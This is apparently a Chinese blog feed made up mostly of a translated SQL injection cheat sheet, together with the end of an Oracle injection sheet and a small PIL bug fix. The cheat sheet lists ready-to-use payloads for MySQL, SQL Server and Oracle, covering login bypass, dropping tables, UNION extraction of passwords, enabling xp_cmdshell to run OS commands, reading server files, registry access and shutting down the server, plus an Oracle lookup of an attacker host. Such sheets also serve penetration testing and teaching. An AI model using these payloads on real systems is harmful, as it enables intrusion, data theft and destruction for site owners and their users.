<pre><code>SELECT bitand(6,2) FROM dual; — 返回2
SELECT bitand(6,1) FROM dual; — 返回0
</code></pre>

<p>ASCII值转字符：</p>

<pre><code>SELECT chr(65) FROM dual; — 返回A
</code></pre>

<p>字符转ASCII码：</p>

<pre><code>SELECT ascii(‘A’) FROM dual; — 返回65
</code></pre>

<p>类型转换：</p>

<pre><code>SELECT CAST(1 AS char) FROM dual;
SELECT CAST(’1′ AS int) FROM dual;
</code></pre>

<p>拼接字符：</p>

<pre><code>SELECT ‘A’ || ‘B’ FROM dual; — 返回AB
</code></pre>

<p>IF语句：</p>

<pre><code>BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END; 
</code></pre>

<p>— 跟SELECT语句在一起时不太管用</p>

<p>Case语句：</p>

<pre><code>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; — 返回1
SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; — 返回2
</code></pre>

<p>绕过引号：</p>

<pre><code>SELECT chr(65) || chr(66) FROM dual; — 返回AB
</code></pre>

<p>延时：</p>

<pre><code>BEGIN DBMS_LOCK.SLEEP(5); END; — priv, 在SELECT中用不了
SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — 如果反查很慢
SELECT UTL_INADDR.get_host_address(‘blah.attacker.com’) FROM dual; — 如果正查很慢
SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual; — 如果发送TCP包被拦截或者很慢
</code></pre>

<p>— 更多关于延时的内容请看<a href="http://technet.microsoft.com/en-us/library/cc512676.aspx">Heavy Queries</a></p>

<p>发送DNS请求：</p>

<pre><code>SELECT UTL_INADDR.get_host_address(‘google.com’) FROM dual;
SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual;
</code></pre>

<p>命令执行：</p>

<p>如果目标机装了JAVA就能执行命令，<a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">看这里</a></p>

<p>有时候ExtProc也可以，不过我一般都成功不了，<a href="http://www.0xdeadbeef.info/exploits/raptor_oraextproc.sql">看这里</a></p>

<p>本地文件读取：</p>

<p><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">UTL_FILE</a>有时候能用。如果下面的语句没有返回null就行。</p>

<pre><code>SELECT value FROM v$parameter2 WHERE name = ‘utl_file_dir’;
</code></pre>

<p><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">JAVA</a>能用来读取和写入文件，除了Oracle Express</p>

<p>主机名称、IP地址：</p>

<pre><code>SELECT UTL_INADDR.get_host_name FROM dual;
SELECT host_name FROM v$instance;
SELECT UTL_INADDR.get_host_address FROM dual; — 查IP
SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — 查主机名称
</code></pre>

<p>定位DB文件：</p>

<pre><code>SELECT name FROM V$DATAFILE;
</code></pre>

<p>默认系统和数据库：</p>

<pre><code>SYSTEM
SYSAUX
</code></pre>

<h3 id="toc_0">额外小贴士：</h3>

<p>一个字符串列出所有表名：</p>

<pre><code>select rtrim(xmlagg(xmlelement(e, table_name || ‘,’)).extract(‘//text()’).extract(‘//text()’) ,’,&#39;) from all_tables 
</code></pre>

<p>– 当你union联查注入的时候只有一行能用与返回数据时使用</p>

<p>盲注排序：</p>

<pre><code>order by case when ((select 1 from user_tables where substr(lower(table_name), 1, 1) = ‘a’ and rownum = 1)=1) then column_name1 else column_name2 end 
</code></pre>

<p>— 你必须知道两个拥有相同数据类型的字段名才能用</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[解决Python的pytesseract库执行时报错]]></title>
    <link href="http://yinzo.github.io/14608288742293.html"/>
    <updated>2016-04-17T01:47:54+08:00</updated>
    <id>http://yinzo.github.io/14608288742293.html</id>
    <content type="html"><![CDATA[
<p>使用pytesseract库识别验证码时遇到以下报错</p>

<pre><code>AttributeError: &#39;NoneType&#39; object has no attribute &#39;bands&#39;
</code></pre>

<p>修改PIL库<code>site-packages/PIL/Image.py</code>1496行</p>

<pre><code>def split(self):
    “Split image into bands”

    if self.im.bands == 1:
</code></pre>

<p>为</p>

<pre><code>def split(self):
    “Split image into bands”
    self.load()
    if self.im.bands == 1:
</code></pre>

<p>即可。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SQL注入速查表]]></title>
    <link href="http://yinzo.github.io/14608288854459.html"/>
    <updated>2016-04-17T01:48:05+08:00</updated>
    <id>http://yinzo.github.io/14608288854459.html</id>
    <content type="html"><![CDATA[
<p><small><em>本文由Yinzo翻译，转载请保留署名。原文地址：<a href="http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/#Enablecmdshell">http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/#Enablecmdshell</a></em></small></p>

<p><small><em>文档版本：1.4</em></small></p>

<h2 id="toc_0">关于SQL注入速查表</h2>

<p>现在仅支持MySQL、Microsoft SQL Server，以及一部分ORACLE和PostgreSQL。大部分样例都不能保证每一个场景都适用。现实场景由于各种插入语、不同的代码环境以及各种不常见甚至奇特的SQL语句，而经常发生变化。</p>

<p>样例仅用于读者理解对于“可能出现的攻击(a potential attack)”的基础概念，并且几乎每一个部分都有一段简洁的概要</p>

<span id="more"></span><!-- more -->

<ul>
<li>M:    MySQL</li>
<li>S: SQL Server</li>
<li>P:    PostgreSQL</li>
<li>O:    Oracle</li>
<li>+: (大概)其他所有数据库</li>
</ul>

<p><em>例子</em>：</p>

<ul>
<li>(MS) 代表 : MySQL 和 SQL Server 等</li>
<li>(M*S) 代表 : 仅对某些版本或者某些附在后文中的特殊情况的 MySQL，以及SQL Server</li>
</ul>

<h2 id="toc_1">目录</h2>

<ol>
<li>关于SQL注入速查表</li>
<li>语法参考，攻击样例以及注入小技巧

<ol>
<li>行间注释

<ol>
<li>使用了行间注释的SQL注入攻击样例</li>
</ol></li>
<li>行内注释

<ol>
<li>使用了行内注释的注入攻击样例</li>
<li>MySQL版本探测攻击样例</li>
</ol></li>
<li>堆叠查询(Stacking Queries)

<ol>
<li>支持堆叠查询的语言/数据库</li>
<li>关于MySQL和PHP</li>
<li>堆叠注入攻击样例</li>
</ol></li>
<li>If语句

<ol>
<li>MySQL的If语句</li>
<li>SQL Server的If语句</li>
<li>使用了If语句的注入攻击样例</li>
</ol></li>
<li>整数(Integers)的使用</li>
<li>字符串操作

<ol>
<li>字符串的串联</li>
</ol></li>
<li>没有引号的字符串

<ol>
<li>使用了16进制的注入攻击样例</li>
</ol></li>
<li>字符串异化(Modification)与联系</li>
<li>Union注入

<ol>
<li>UNION-语言问题处理</li>
</ol></li>
<li>绕过登陆界面(SMO+)</li>
<li>绕过检查MD5哈希的登陆界面

<ol>
<li>绕过MD5哈希检查的例子(MSP)</li>
</ol></li>
<li>基于错误(Error Based)-探测字段名

<ol>
<li>使用<code>HAVING</code>来探测字段名(S)</li>
<li>在<code>SELECT</code>查询中使用<code>ORDER BY</code>探测字段数(MSO+)</li>
</ol></li>
<li>数据类型、UNION、之类的

<ol>
<li>获取字段类型</li>
</ol></li>
<li>简单的注入(MSO+)</li>
<li>有用的函数、信息收集、内置程序、大量注入笔记

<ol>
<li><code>@@version</code>(MS)</li>
<li>文件插入(Bulk Insert)(S)</li>
<li>BCP(S)</li>
<li>SQL Server的VBS/WSH(S)</li>
<li>执行系统命令，xp_cmdshell(S)</li>
<li>SQL Server中的一些特殊的表(S)</li>
<li>SQL Server的其它内置程序(S)</li>
<li>大量MSSQL笔记</li>
<li>使用LIMIT(M)或ORDER(MSO)的注入</li>
<li>关掉SQL Server(S)</li>
</ol></li>
<li>在SQL Server 2005中启用xp_cmdshell</li>
<li>探测SQL Server数据库的结构(S)

<ol>
<li>获取用户定义表</li>
<li>获取字段名</li>
</ol></li>
<li>移动记录(Moving records)(S)</li>
<li>快速的脱掉基于错误(Error Based)的SQL Server注入(S)</li>
<li>盲注

<ol>
<li>关于盲注</li>
<li>实战中的盲注实例</li>
</ol></li>
<li>延时盲注

<ol>
<li><code>WAITFOR DELAY [time]</code>(S)</li>
<li>实例</li>
<li><code>BENCHMARK()</code>(M)</li>
<li>实例</li>
<li><code>pg_sleep(seconds)</code>(P)</li>
</ol></li>
<li>掩盖痕迹

<ol>
<li><code>-sp_password log bypass</code>(S)</li>
</ol></li>
<li>注入测试</li>
<li>一些其他的MySQL笔记

<ol>
<li>MySQL中好用的函数</li>
</ol></li>
<li>SQL注入的高级使用

<ol>
<li>强制SQL Server来得到NTLM哈希</li>
<li>Bulk insert UNC共享文件 (S) </li>
</ol></li>
</ol></li>
<li>待办事项 / 联系方式 / 帮助</li>
</ol>

<h2 id="toc_2">语法参考，攻击样例以及注入小技巧</h2>

<h3 id="toc_3">行间注释</h3>

<p><strong>注释掉查询语句的其余部分</strong><br/>
行间注释通常用于注释掉查询语句的其余部分，这样你就不需要去修复整句语法了。</p>

<ul>
<li><p><code>--</code>(SM)</p>

<p><code>DROP sampletable;--</code></p></li>
<li><p><code>#</code>(M)</p>

<p><code>DROP sampletable;#</code></p></li>
</ul>

<h4 id="toc_4">使用了行间注释的SQL注入攻击样例</h4>

<blockquote>
<p>用户名:<code>admin&#39;--</code></p>
</blockquote>

<ul>
<li>构成语句:<code>SELECT * FROM members WHERE username = &#39;admin&#39;--&#39; AND password = &#39;password&#39;</code>
这会使你以admin身份登陆，因为其余部分的SQL语句被注释掉了。</li>
</ul>

<h3 id="toc_5">行内注释</h3>

<p><strong>通过不关闭注释注释掉查询语句的其余部分</strong>，或者用于<strong>绕过过滤</strong>，移除空格，混淆，或探测数据库版本。</p>

<ul>
<li><code>/*注释内容*/</code>(SM)

<ul>
<li><code>DROP/*comment*/sampletable</code></li>
<li><code>DR/**/OP/*绕过过滤*/sampletable</code></li>
<li><code>SELECT/*替换空格*/password/**/FROM/**/Members</code></li>
</ul></li>
<li><p><code>/*! MYSQL专属 */</code> (M) </p>

<p>这是个MySQL专属语法。非常适合用于探测MySQL版本。如果你在注释中写入代码，只有MySQL才会执行。同样的你也可以用这招，使得只有高于某版本的服务器才执行某些代码。<br/>
<code>SELECT /*!32302 1/0, */ 1 FROM tablename</code></p></li>
</ul>

<h4 id="toc_6">使用了行内注释的注入攻击样例</h4>

<blockquote>
<p>ID:<code>10; DROP TABLE members /*</code></p>
</blockquote>

<p>简单地摆脱了处理后续语句的麻烦，同样你可以使用<code>10; DROP TABLE members --</code></p>

<h4 id="toc_7">MySQL版本探测攻击样例</h4>

<blockquote>
<p><code>SELECT /*!32302 1/0, */ 1 FROM tablename</code></p>
</blockquote>

<p>如果MySQL的版本高于<strong>3.23.02</strong>，会抛出一个<code>division by 0 error</code></p>

<blockquote>
<p>ID:<code>/*!32302 10*/</code></p>

<p>ID:<code>10</code></p>
</blockquote>

<p>如果MySQL版本高于3.23.02，以上两次查询你将得到相同的结果</p>

<h3 id="toc_8">堆叠查询(Stacking Queries)</h3>

<p><strong>一句代码之中执行多个查询语句</strong>，这在每一个注入点都非常有用，尤其是使用SQL Server后端的应用</p>

<ul>
<li><code>;</code>(S)
<code>SELECT * FROM members; DROP members--</code>
结束一个查询并开始一个新的查询</li>
</ul>

<h4 id="toc_9">支持堆叠查询的语言/数据库</h4>

<p><strong>绿色：</strong>支持，<strong>暗灰色：</strong>不支持，<strong>浅灰色：</strong>未知<br/>
<img src="http://ww2.sinaimg.cn/large/7d52f1ffgw1euwiy9impsj20dn03sgls.jpg" alt="支持堆叠查询的语言/数据库"/></p>

<h4 id="toc_10">关于MySQL和PHP</h4>

<p>阐明一些问题。</p>

<p><strong>PHP-MySQL不支持堆叠查询</strong>，Java不支持堆叠查询（ORACLE的我很清楚，其他的就不确定了）。一般来说MySQL支持堆叠查询，但由于大多数PHP-Mysql应用框架的数据库层都不能执行第二条查询，或许MySQL的客户端支持这个，我不确定，有人能确认一下吗？</p>

<p><em>（译者注：MySQL 5.6.20版本下客户端支持堆叠查询）</em></p>

<h4 id="toc_11">堆叠注入攻击样例</h4>

<blockquote>
<p>ID:<code>10;DROP members --</code></p>
</blockquote>

<p>构成语句：<code>SELECT * FROM products WHERE id = 10; DROP members--</code></p>

<p>这在执行完正常查询之后将会执行DROP查询。</p>

<h3 id="toc_12">If语句</h3>

<p>根据If语句得到响应。这是<strong>盲注(Blind SQL Injection)的关键之一</strong>，同样也能简单而<strong>准确地</strong>进行一些测试。</p>

<h4 id="toc_13">MySQL的If语句</h4>

<ul>
<li><p><code>IF(condition,true-part,false-part)</code>(M)</p>

<blockquote>
<p><code>SELECT IF (1=1,&#39;true&#39;,&#39;false&#39;)</code></p>
</blockquote></li>
</ul>

<h4 id="toc_14">SQL Server的If语句</h4>

<ul>
<li><p><code>IF condition true-part ELSE false-part</code>(S)</p>

<blockquote>
<p><code>IF (1=1) SELECT &#39;true&#39; ELSE SELECT &#39;false&#39;</code></p>
</blockquote></li>
</ul>

<h4 id="toc_15">使用了If语句的注入攻击样例</h4>

<blockquote>
<p><code>if ((select user) = &#39;sa&#39; OR (select user) = &#39;dbo&#39;) select 1 else select 1/0</code>(S)</p>
</blockquote>

<p>如果当前用户不是<strong>&ldquo;sa&quot;或者&quot;dbo&rdquo;</strong>,就会抛出一个<strong><code>divide by zero error</code></strong>。</p>

<h3 id="toc_16">整数(Integers)的使用</h3>

<p>对于绕过十分有用，比如<strong>magic_quotes() 和其他类似过滤器</strong>，甚至是各种WAF。</p>

<ul>
<li><p><code>0xHEXNUMBER</code>(SM)</p>

<p>(HEXNUMBER:16进制数）<br/>
你能这样使用16进制数：</p>

<ul>
<li><p><code>SELECT CHAR(0x66)</code>(S)</p></li>
<li><p><code>SELECT 0x5045</code>(M) (这不是一个整数，而会是一个16进制字符串）</p></li>
<li><p><code>SELECT 0x50 + 0x45</code>(M) (现在这是整数了)</p></li>
</ul></li>
</ul>

<h3 id="toc_17">字符串操作</h3>

<p>与字符串相关的操作。这对于构造一个不含有引号，用于绕过或探测数据库都非常的有用。</p>

<h4 id="toc_18">字符串的串联</h4>

<ul>
<li><p><code>+</code>(S)</p>

<p><code>SELECT login + &#39;-&#39; + password FROM members</code></p></li>
<li><p><code>||</code> (*MO) </p>

<p><code>SELECT login || &#39;-&#39; || password FROM members</code></p></li>
</ul>

<p>*<strong>关于MySQL的&quot;||&ldquo;</strong><br/>
这个仅在ANSI模式下的MySQL执行，其他情况下都会当成&#39;逻辑操作符&#39;并返回一个0。更好的做法是使用<code>CONCAT()</code>函数。</p>

<ul>
<li><p><code>CONCAT(str1, str2, str3, ...)</code>(M)</p>

<p>连接参数里的所有字符串<br/>
例：<code>SELECT CONCAT(login, password) FROM members</code></p></li>
</ul>

<h3 id="toc_19">没有引号的字符串</h3>

<p>有很多使用字符串的方法，但是这几个方法是一直可用的。使用<code>CHAR()</code>(MS)和<code>CONCAT()</code>(M)来生成没有引号的字符串</p>

<ul>
<li><p><code>0x457578</code> (M) - 16进制编码的字符串</p>

<p><code>SELECT 0x457578</code></p>

<p>这在MySQL中会被当做字符串处理</p></li>
<li><p>在MySQL中使用16进制字符串的一个简单方式：<br/>
<code>SELECT CONCAT(&#39;0x&#39;,HEX(&#39;c:\\boot.ini&#39;))</code></p></li>
<li><p>在MySQL中使用<code>CONCAT()</code>函数：<br/>
<code>SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77))</code> (M) </p>

<p>这会返回&#39;KLM&#39;</p></li>
<li><p><code>SELECT CHAR(75)+CHAR(76)+CHAR(77)</code> (S) </p>

<p>这会返回&#39;KLM&#39;</p></li>
</ul>

<h4 id="toc_20">使用了16进制的注入攻击样例</h4>

<ul>
<li><p><code>SELECT LOAD_FILE(0x633A5C626F6F742E696E69)</code> (M) </p>

<p>这会显示<strong>c:\boot.ini</strong>的内容</p></li>
</ul>

<h3 id="toc_21">字符串异化(Modification)与联系</h3>

<ul>
<li><p><code>ASCII()</code> (SMP) </p>

<p>返回最左边字符的ASCII码的值。这是一个用于盲注的重要函数。</p>

<p>例：<code>SELECT ASCII(&#39;a&#39;)</code></p></li>
<li><p><code>CHAR()</code> (SM) </p>

<p>把整数转换为对应ASCII码的字符</p>

<p>例：<code>SELECT CHAR(64)</code></p></li>
</ul>

<h3 id="toc_22">Union注入</h3>

<p>通过union你能跨表执行查询。最简单的，你能注入一个查询使得它返回另一个表的内容。<br/>
<code>SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members</code></p>

<p>这会把news表和members表的内容合并返回。</p>

<p>另一个例子：<br/>
<code>&#39; UNION SELECT 1, &#39;anotheruser&#39;, &#39;doesnt matter&#39;, 1--</code></p>

<h4 id="toc_23">UNION-语言问题处理</h4>

<p>当你使用Union来注入的时候，经常会遇到一些错误，这是由于不同的语言的设置（表的设置、字段设置、表或数据库的设置等等）。这些办法对于解决那些问题都挺有用的，尤其是当你处理日文，俄文，土耳其文的时候你会就会见到他们的。</p>

<ul>
<li><p>使用 <code>COLLATE SQL_Latin1_General_Cp1254_CS_AS</code>(S)</p>

<p>或者其它的什么语句，具体的自己去查SQL Server的文档。<br/>
例：<code>SELECT header FROM news UNION ALL SELECT name COLLATE SQL_Latin1_General_Cp1254_CS_AS FROM members</code></p></li>
<li><p><code>Hex()</code>(M)</p>

<p>百试百灵~</p></li>
</ul>

<h3 id="toc_24">绕过登陆界面(SMO+)</h3>

<p><em>SQL注入101式</em>(大概是原文名字吧？),登陆小技巧</p>

<ul>
<li><code>admin&#39; --</code></li>
<li><code>admin&#39; #</code></li>
<li><code>admin&#39;/*</code></li>
<li><code>&#39; or 1=1--</code></li>
<li><code>&#39; or 1=1#</code></li>
<li><code>&#39; or 1=1/*</code></li>
<li><code>&#39;) or &#39;1&#39;=&#39;1--</code></li>
<li><code>&#39;) or (&#39;1&#39;=&#39;1--</code></li>
<li>&hellip;.</li>
<li>以不同的用户登陆 (SM*) 
<code>&#39; UNION SELECT 1, &#39;anotheruser&#39;, &#39;doesnt matter&#39;, 1--</code></li>
</ul>

<p>*<em>旧版本的MySQL不支持union</em></p>

<h3 id="toc_25">绕过检查MD5哈希的登陆界面</h3>

<p>如果应用是先通过用户名，读取密码的MD5，然后和你提供的密码的MD5进行比较，那么你就需要一些额外的技巧才能绕过验证。你可以把一个已知明文的MD5哈希和它的明文一起提交，使得程序不使用从数据库中读取的哈希，而使用你提供的哈希进行比较。</p>

<h4 id="toc_26">绕过MD5哈希检查的例子(MSP)</h4>

<blockquote>
<p>用户名：<code>admin</code></p>

<p>密码：<code>1234 &#39; AND 1=0 UNION ALL SELECT &#39;admin&#39;,&#39;81dc9bdb52d04dc20036dbd8313ed055</code></p>
</blockquote>

<p>其中<code>81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)</code></p>

<h3 id="toc_27">基于错误(Error Based)-探测字段名</h3>

<h4 id="toc_28">使用<code>HAVING</code>来探测字段名(S)</h4>

<ul>
<li><code>&#39; HAVING 1=1 --</code></li>
<li><code>&#39; GROUP BY table.columnfromerror1 HAVING 1=1 --</code></li>
<li><code>&#39; GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 --</code></li>
<li>……</li>
<li><code>&#39; GROUP BY table.columnfromerror1, columnfromerror2,columnfromerror(n) HAVING 1=1 --</code></li>
<li>直到它不再报错，就算搞定了</li>
</ul>

<h4 id="toc_29">在<code>SELECT</code>查询中使用<code>ORDER BY</code>探测字段数(MSO+)</h4>

<p>通过ORDER BY来探测字段数能够加快union注入的速度。</p>

<ul>
<li><code>ORDER BY 1--</code></li>
<li><code>ORDER BY 2--</code></li>
<li>……</li>
<li><code>ORDER BY N--</code> </li>
<li>一直到它报错为止，最后一个成功的数字就是字段数。</li>
</ul>

<h3 id="toc_30">数据类型、UNION、之类的</h3>

<p><strong>提示：</strong></p>

<ul>
<li>经常给<strong>UNION</strong>配上<strong>ALL</strong>使用，因为经常会有相同数值的字段，而缺省情况下UNION都会尝试返回唯一值(records with distinct)</li>
<li>如果你每次查询只能有一条记录，而你不想让原本正常查询的记录占用这宝贵的记录位，你可以使用<code>-1</code>或者根本不存在的值来搞定原查询（前提是注入点在WHERE里）。</li>
<li>在UNION中使用NULL，对于大部分数据类型来说这样都比瞎猜字符串、日期、数字之类的来得强

<ul>
<li>盲注的时候要小心判断错误是来自应用的还是来自数据库的。因为像ASP.NET就经常会在你使用NULL的时候抛出错误（因为开发者们一般都没想到用户名的框中会出现NULL）</li>
</ul></li>
</ul>

<h4 id="toc_31">获取字段类型</h4>

<ul>
<li><p><code>&#39; union select sum(columntofind) from users--</code> (S) </p>

<pre><code>Microsoft OLE DB Provider for ODBC Drivers error &#39;80040e07&#39; 
[Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a **varchar** data type as an argument. 
</code></pre>

<p>如果没有返回错误说明字段是<strong>数字类型</strong></p></li>
<li><p>同样的，你可以使用<code>CAST()</code>和<code>CONVERT()</code></p>

<ul>
<li>  <code>SELECT * FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL--</code></li>
</ul></li>
<li><p><code>11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2 –-</code></p>

<p>没报错 - 语法是正确的。 这是MS SQL Server的语法。 继续。</p></li>
<li><p><code>11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2 –-</code></p>

<p>没报错 – 第一个字段是<code>integer</code>类型。</p></li>
<li><p><code>11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2 --</code></p>

<p>报错 – 第二个字段不是<code>integer</code>类型</p></li>
<li><p><code>11223344) UNION SELECT 1,’2’,NULL,NULL WHERE 1=2 –-</code></p>

<p>没报错 – 第二个字段是<code>string</code>类型。</p></li>
<li><p><code>11223344) UNION SELECT 1,’2’,3,NULL WHERE 1=2 –-</code></p>

<p>报错 – 第三个字段不是<code>integer</code> </p></li>
<li><p>……</p>

<pre><code>Microsoft OLE DB Provider for SQL Server error &#39;80040e07&#39; 
Explicit conversion from data type int to image is not allowed.
</code></pre></li>
</ul>

<p><strong>你在遇到union错误之前会先遇到convert()错误</strong>，所以先使用convert()再用union</p>

<h3 id="toc_32">简单的注入(MSO+)</h3>

<p><code>&#39;; insert into users values( 1, &#39;hax0r&#39;, &#39;coolpass&#39;, 9 )/*</code></p>

<h3 id="toc_33">有用的函数、信息收集、内置程序、大量注入笔记</h3>

<h4 id="toc_34"><code>@@version</code>(MS)</h4>

<p>数据库的版本。这是个常量，你能把它当做字段来SELECT，而且不需要提供表名。同样的你也可以用在INSERT/UPDATE语句里面，甚至是函数里面。</p>

<p><code>INSERT INTO members(id, user, pass) VALUES(1, &#39;&#39;+SUBSTRING(@@version,1,10) ,10)</code></p>

<h4 id="toc_35">文件插入(Bulk Insert)(S)</h4>

<p>把文件内容插入到表中。如果你不知道应用目录你可以去<strong>读取IIS metabase file</strong>(<em>仅IIS 6</em>)(<em>%systemroot%\system32\inetsrv\MetaBase.xml</em>)然后在里面找到应用目录。</p>

<ol>
<li>新建一个表foo(<code>line varchar(8000)</code>)</li>
<li><code>BULK INSERT foo FROM &#39;c:\inetpub\wwwroot\login.asp&#39;</code></li>
<li>DROP了临时表，重复另一个文件</li>
</ol>

<h4 id="toc_36">BCP(S)</h4>

<p>写入文件。这个功能需要登录<br/>
<code>bcp &quot;SELECT * FROM test..foo&quot; queryout c:\inetpub\wwwroot\runcommand.asp -c -Slocalhost -Usa -Pfoobar</code></p>

<h4 id="toc_37">SQL Server的VBS/WSH(S)</h4>

<p>由于ActiveX的支持，你能在SQL Server中使用VBS/WSH</p>

<pre><code>declare @o int 
exec sp_oacreate &#39;wscript.shell&#39;, @o out 
exec sp_oamethod @o, &#39;run&#39;, NULL, &#39;notepad.exe&#39;
</code></pre>

<blockquote>
<p>Username: <code>&#39;; declare @o int exec sp_oacreate &#39;wscript.shell&#39;, @o out exec sp_oamethod @o, &#39;run&#39;, NULL, &#39;notepad.exe&#39; --</code></p>
</blockquote>

<h4 id="toc_38">执行系统命令，xp_cmdshell(S)</h4>

<p>众所周知的技巧，SQL Server 2005默认是关闭的。你需要admin权限</p>

<p><code>EXEC master.dbo.xp_cmdshell &#39;cmd.exe dir c:&#39;</code></p>

<p>用ping简单的测试一下，用之前先检查一下防火墙和嗅探器。</p>

<p><code>EXEC master.dbo.xp_cmdshell &#39;ping &#39;</code></p>

<p>如果有错误，或者union或者其他的什么，你都不能直接读到结果。</p>

<h4 id="toc_39">SQL Server中的一些特殊的表(S)</h4>

<ul>
<li><p>Error Messages</p>

<p><code>master..sysmessages</code></p></li>
<li><p>Linked Servers </p>

<p><code>master..sysservers</code></p></li>
<li><p>Password (2000和2005版本的都能被破解，这俩的加密算法很相似) </p>

<p>SQL Server 2000: masters..sysxlogins </p>

<p>SQL Server 2005 : sys.sql_logins </p></li>
</ul>

<h4 id="toc_40">SQL Server的其它内置程序(S)</h4>

<ol>
<li><p>命令执行 (xp_cmdshell) </p>

<p><code>exec master..xp_cmdshell &#39;dir&#39;</code></p></li>
<li><p>注册表操作 (xp_regread)</p>

<ol>
<li>xp_regaddmultistring</li>
<li>xp_regdeletekey</li>
<li>xp_regdeletevalue</li>
<li>xp_regenumkeys</li>
<li>xp_regenumvalues</li>
<li>xp_regread</li>
<li>xp_regremovemultistring</li>
<li><p>xp_regwrite </p>

<pre><code>exec xp_regread HKEY_LOCAL_MACHINE, &#39;SYSTEM\CurrentControlSet       \Services\lanmanserver\parameters&#39;, &#39;nullsessionshares&#39; 
exec xp_regenumvalues HKEY_LOCAL_MACHINE, &#39;SYSTEM       \CurrentControlSet  \Services\snmp\parameters\validcommunities&#39;
</code></pre></li>
</ol></li>
<li><p>管理服务(xp_servicecontrol)</p></li>
<li><p>媒体(xp_availablemedia)</p></li>
<li><p>ODBC 资源 (xp_enumdsn)</p></li>
<li><p>登录 (xp_loginconfig)</p></li>
<li><p>创建Cab文件 (xp_makecab)</p></li>
<li><p>域名列举 (xp_ntsec_enumdomains)</p></li>
<li><p>杀进程 (need PID) (xp_terminate_process)</p></li>
<li><p>新建进程 (<em>实际上你想干嘛都行</em>) </p>

<pre><code>sp_addextendedproc ‘xp_webserver’, ‘c:\temp\x.dll’ 
exec xp_webserver
</code></pre></li>
<li><p>写文件进UNC或者内部路径 (sp_makewebtask)</p></li>
</ol>

<h4 id="toc_41">大量MSSQL笔记</h4>

<p><code>SELECT * FROM master..sysprocesses /*WHERE spid=@@SPID*/</code></p>

<p><code>DECLARE @result int; EXEC @result = xp_cmdshell &#39;dir *.exe&#39;;IF (@result = 0) SELECT 0 ELSE SELECT 1/0</code></p>

<p>HOST_NAME() <br/>
IS_MEMBER (Transact-SQL)<br/><br/>
IS_SRVROLEMEMBER (Transact-SQL)<br/><br/>
OPENDATASOURCE (Transact-SQL)</p>

<p><code>INSERT tbl EXEC master..xp_cmdshell OSQL /Q&quot;DBCC SHOWCONTIG&quot;</code></p>

<p>OPENROWSET (Transact-SQL)  - <a href="http://msdn2.microsoft.com/en-us/library/ms190312.aspx">http://msdn2.microsoft.com/en-us/library/ms190312.aspx</a></p>

<p>你不能在 SQL Server 的Insert查询里使用子查询(sub select).</p>

<h4 id="toc_42">使用LIMIT(M)或ORDER(MSO)的注入</h4>

<p><code>SELECT id, product FROM test.test t LIMIT 0,0 UNION ALL SELECT 1,&#39;x&#39;/*,10 ;</code></p>

<p>如果注入点在LIMIT的第二个参数处，你可以把它注释掉或者使用union注入。</p>

<h4 id="toc_43">关掉SQL Server(S)</h4>

<p>如果你真的急了眼，<code>&#39;;shutdown --</code></p>

<h3 id="toc_44">在SQL Server 2005中启用xp_cmdshell</h3>

<p>默认情况下，SQL Server 2005中像xp_cmdshell以及其它危险的内置程序都是被禁用的。如果你有admin权限，你就可以启动它们。</p>

<pre><code>EXEC sp_configure &#39;show advanced options&#39;,1 
RECONFIGURE

EXEC sp_configure &#39;xp_cmdshell&#39;,1 
RECONFIGURE
</code></pre>

<h3 id="toc_45">探测SQL Server数据库的结构(S)</h3>

<h4 id="toc_46">获取用户定义表</h4>

<p><code>SELECT name FROM sysobjects WHERE xtype = &#39;U&#39;</code></p>

<h4 id="toc_47">获取字段名</h4>

<p><code>SELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = &#39;tablenameforcolumnnames&#39;)</code></p>

<h3 id="toc_48">移动记录(Moving records)(S)</h3>

<ul>
<li><p>修改WHERE，使用<strong>NOT IN</strong>或者<strong>NOT EXIST</strong><br/>
<code>... WHERE users NOT IN (&#39;First User&#39;, &#39;Second User&#39;)</code><br/>
<code>SELECT TOP 1 name FROM members WHERE NOT EXIST(SELECT TOP 0 name FROM members)</code> &ndash; 这个好用</p></li>
<li><p>脏的不行的小技巧</p>

<p><code>SELECT * FROM Product WHERE ID=2 AND 1=CAST((Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE i.id&lt;=o.id) AS x, name from sysobjects o) as p where p.x=3) as int</code></p>

<p><code>Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE xtype=&#39;U&#39; and i.id&lt;=o.id) AS x, name from sysobjects o WHERE o.xtype = &#39;U&#39;) as p where p.x=21</code></p></li>
</ul>

<h3 id="toc_49">快速的脱掉基于错误(Error Based)的SQL Server注入(S)</h3>

<p><code>&#39;;BEGIN DECLARE @rt varchar(8000) SET @rd=&#39;:&#39; SELECT @rd=@rd+&#39; &#39;+name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = &#39;MEMBERS&#39;) AND name&gt;@rd SELECT @rd AS rd into TMP_SYS_TMP end;--</code></p>

